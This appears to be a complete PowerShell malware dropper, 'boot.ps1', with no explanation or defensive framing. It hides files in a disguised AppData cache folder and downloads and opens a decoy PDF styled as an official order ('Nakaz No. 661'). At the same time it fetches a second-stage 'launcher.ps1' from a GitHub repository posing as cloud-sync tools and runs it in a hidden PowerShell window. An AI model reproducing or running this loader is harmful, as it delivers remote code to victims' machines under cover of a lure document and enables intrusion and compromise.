# boot.ps1 - Minimal loader, downloads and executes full launcher
$cache="$env:APPDATA\Microsoft\Windows\Caches"
if(!(Test-Path $cache)){mkdir $cache -Force|Out-Null}
$pdfUrl='https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/Nakaz_No._661_vid_02.03.2026-4.pdf'
$pdfPath="$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
if(!(Test-Path $pdfPath)){(New-Object Net.WebClient).DownloadFile($pdfUrl,$pdfPath)}
Start-Process $pdfPath
# Download and run full launcher in background
$launcherUrl='https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1'
$launcherPath="$cache\launcher.ps1"
(New-Object Net.WebClient).DownloadFile($launcherUrl,$launcherPath)
Start-Process powershell -Args "-WindowStyle Hidden -File `"$launcherPath`"" -WindowStyle Hidden